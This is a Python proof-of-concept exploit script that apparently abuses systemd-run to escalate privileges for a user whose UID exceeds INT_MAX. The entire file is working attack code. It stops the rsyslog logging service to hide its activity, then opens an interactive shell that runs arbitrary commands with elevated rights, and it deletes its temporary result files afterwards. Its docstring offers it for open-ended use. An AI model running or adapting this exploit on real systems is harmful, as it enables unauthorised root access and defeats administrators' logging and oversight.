#!/usr/bin/env python

"""
This PoC code is meant to be run as the user with a UID over INT_MAX.

During the run it will drop you into a sort of shell and allow you to run commands as the user,
you can pretty much do whatever you want once in the shell.
"""

import os
import time
import string
import shlex
import random
import subprocess

# template that will be used to run the commands
COMMAND_TEMPLATE = "systemd-run bash -c '{} > {}'"


def results_filename(path="/tmp", length=16):
    """
    generate a filename to store the results in
    """
    retval = []
    for _ in range(length):
        retval.append(random.choice(string.ascii_letters))
    return "{}/{}.POC".format(path, ''.join(retval))


def clean_temp_files(path="/tmp"):
    """
    clean the generated temporary files
    """
    for item in os.listdir(path):
        if "POC" in item:
            try:
                subprocess.call(shlex.split("systemd-run bash -c 'rm /tmp/{}' 2>/dev/null".format(item)))
            except:
                print("issue cleaning {}".format(item))
    print("cleaned temp files")


def read_results_file(path):
    """
    read the results
    """
    with open(path) as data:
        return data.read()


def send_command(command, res_file, check=True):
    """
    send the command
    """
    if not check:
        return subprocess.call(shlex.split(COMMAND_TEMPLATE.format(command, res_file)))
    else:
        return subprocess.check_output(shlex.split(COMMAND_TEMPLATE.format(command, res_file)))


def create_shell_interpreter():
    """
    create the shell
    """
    while True:
        command = raw_input("\n\n> ")
        res_file_name = results_filename()
        send_command(command, res_file_name)
        time.sleep(3)
        print("\nOUTPUT:\n{}".format(open(res_file_name).read()))


def file_logging(suspend=True):
    """
    stop logging for a little bit
    """
    if suspend:
        return subprocess.call(shlex.split("systemd-run bash -c 'service rsyslog stop'"))
    else:
        return subprocess.call(shlex.split("systemd-run bash -c 'service rsyslog start'"))


def main():
    """
    main function
    """
    try:
        results_file = results_filename()
        command = "echo"
        output = send_command(command, results_file, check=True)
        if "access denied" not in output.lower():
            print("suspending file logging")
            file_logging()
            print("logging suspended launching shell\n\n")
            create_shell_interpreter()
        else:
            raise Exception("access denied")
    except KeyboardInterrupt:
        print("user quit")
        clean_temp_files()
    except Exception as e:
        print("error: {}".format(e))
        clean_temp_files()
    print("restarting file logging")
    file_logging(suspend=False)


if __name__ == "__main__":
    main()